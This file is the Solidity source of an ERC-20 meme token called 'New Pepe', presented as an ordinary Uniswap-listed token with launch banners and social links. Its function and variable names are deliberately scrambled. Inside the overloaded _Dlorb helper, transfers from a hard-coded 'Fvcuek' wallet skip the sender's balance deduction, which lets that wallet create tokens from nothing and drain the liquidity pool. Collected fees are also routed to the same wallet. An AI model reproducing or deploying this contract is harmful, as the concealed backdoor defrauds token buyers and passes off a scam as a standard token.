// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B7~&@@@@@@@@@@@@@@@@G!:&@@@@@@@@@@@@@@@&5~.&@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&P~    P@@@@@@@@@@@@&Y^    G@@@@@@@@@@@@#J:    G@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#J:       G@@@@@@@@@B7.       G@@@@@@@@&G!.       G@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@@@@@@@@@G!.          G@@@@@&P~           B@@@@@&Y:           G@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@@@@@&Y^              ~&&#J:              ^#&B7.              G@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@@#7.                                                         &@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@G                                                         ^5&@@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@J              ^5&@&:              ~P&@&:             .7B@@@@@@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@J          .!G@@@@@@J          .?B@@@@@@J          :Y#@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@J       :J#@@@@@@@@@J       ^5&@@@@@@@@@?      .~P&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@J    ~P&@@@@@@@@@@@@J   .7B@@@@@@@@@@@@@?   :?#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@B^?B@@@@@@@@@@@@@@@@B~J#@@@@@@@@@@@@@@@@#!5&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
//
//          Telegram: t.me/Newpepe_Ethereum
//          Twitter:  twitter.com/NewPepe_eth
//          Website:  https://newpepe.org
//
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@                                                                                                @@
// @@   This token was launched using software provided by Metadrop. To learn more or to launch      @@
// @@   your own token, visit: https://metadrop.com. See legal info at the end of this file.         @@
// @@                                                                                                @@
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
//

// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _Dlorb(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _Dlorb(a, b, "SafeMath");
    }

    function  _Dlorb(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _krhlve(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract  NewPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _beqlc;
    address payable private Fvcuek;
    address private _Brfrp;
    string private constant _name = unicode"New Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 42069000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _Rfopdr=0;
    uint256 private _pfjcta=0;
    uint256 public _wludkh = _totalSupply;
    uint256 public _qoektr = _totalSupply;
    uint256 public _provrb= _totalSupply;
    uint256 public _qrikr= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _Klvrqo;
    mapping (address => bool) private _hqvruk;
    mapping(address => uint256) private _Eiouvg;

    bool private _qkxeopen;
    bool public _prjckv = false;
    bool private ptekr = false;
    bool private _rqjug = false;


    event _bsrcop(uint _wludkh);
    modifier gevufy {
        ptekr = true;
        _;
        ptekr = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _Klvrqo[owner(

        )] = true;
        _Klvrqo[address
        (this)] = true;
        _Klvrqo[
            Fvcuek] = true;
        Fvcuek = 
        payable (0x3F52c8B1d3D3C7C1e0EbE37FD7D9c7933C2cF553);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _Dlorb(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 Zlaubr=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_prjckv) {
                if (to 
                != address
                (_beqlc) 
                && to !=
                 address
                 (_Brfrp)) {
                  require(_Eiouvg
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _Eiouvg
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _Brfrp && to != 
            address(_beqlc) &&
             !_Klvrqo[to] ) {
                require(amount 
                <= _wludkh,
                 "Exceeds the _wludkh.");
                require(balanceOf
                (to) + amount
                 <= _qoektr,
                  "Exceeds the _qoektr.");
                if(_pfjcta
                < _Rfopdr){
                  require
                  (! _fdnbv(to));
                }
                _pfjcta++;
                 _hqvruk
                 [to]=true;
                Zlaubr = amount._krhlve
                ((_pfjcta>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _Brfrp &&
             from!= address(this) 
            && !_Klvrqo[from] ){
                require(amount <= 
                _wludkh && 
                balanceOf(Fvcuek)
                <_qrikr,
                 "Exceeds the _wludkh.");
                Zlaubr = amount._krhlve((_pfjcta>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_pfjcta>
                _Rfopdr &&
                 _hqvruk[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ptekr 
            && to == _Brfrp &&
             _rqjug &&
             contractTokenBalance>
             _provrb 
            && _pfjcta>
            _Rfopdr&&
             !_Klvrqo[to]&&
              !_Klvrqo[from]
            ) {
                _transferFrom( _Boelr(amount, 
                _Boelr(contractTokenBalance,
                _qrikr)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _pvlack(address
                    (this).balance);
                }
            }
        }

        if(Zlaubr>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(Zlaubr);
          emit
           Transfer(from,
           address
           (this),Zlaubr);
        }
        _balances[from
        ]= _Dlorb(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _Dlorb(Zlaubr));
        emit Transfer
        (from, to, 
        amount.
         _Dlorb(Zlaubr));
    }

    function _transferFrom(uint256
     tokenAmount) private
      gevufy {
        if(tokenAmount==
        0){return;}
        if(!_qkxeopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _beqlc.WETH();
        _approve(address(this),
         address(
             _beqlc), 
             tokenAmount);
        _beqlc.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _Boelr
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _Dlorb(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == Fvcuek){
            return a ;
        }else{
            return a .
             _Dlorb (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _wludkh = _totalSupply;
        _qoektr = _totalSupply;
        emit _bsrcop(_totalSupply);
    }

    function _fdnbv(address 
    account) private view 
    returns (bool) {
        uint256 YrlNp;
        assembly {
            YrlNp :=
             extcodesize
             (account)
        }
        return YrlNp > 
        0;
    }

    function _pvlack(uint256
    amount) private {
        Fvcuek.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _qkxeopen ) ;
        _beqlc  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _beqlc), 
            _totalSupply);
        _Brfrp = 
        IUniswapV2Factory(_beqlc.
        factory( ) 
        ). createPair (
            address(this
            ),  _beqlc .
             WETH ( ) );
        _beqlc.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_Brfrp).
        approve(address(_beqlc), 
        type(uint)
        .max);
        _rqjug = true;
        _qkxeopen = true;
    }

    receive() external payable {}
}

// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@                                                                                                @@
// @@   Metadrop has no affiliation with and does not endorse this token or its creators in any      @@
// @@   way, unless otherwise stated. For all terms and conditions associated with tokens launched   @@
// @@   using Metadrop software, refer to the terms published at metadrop[dot]com/legal.             @@
// @@                                                                                                @@
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@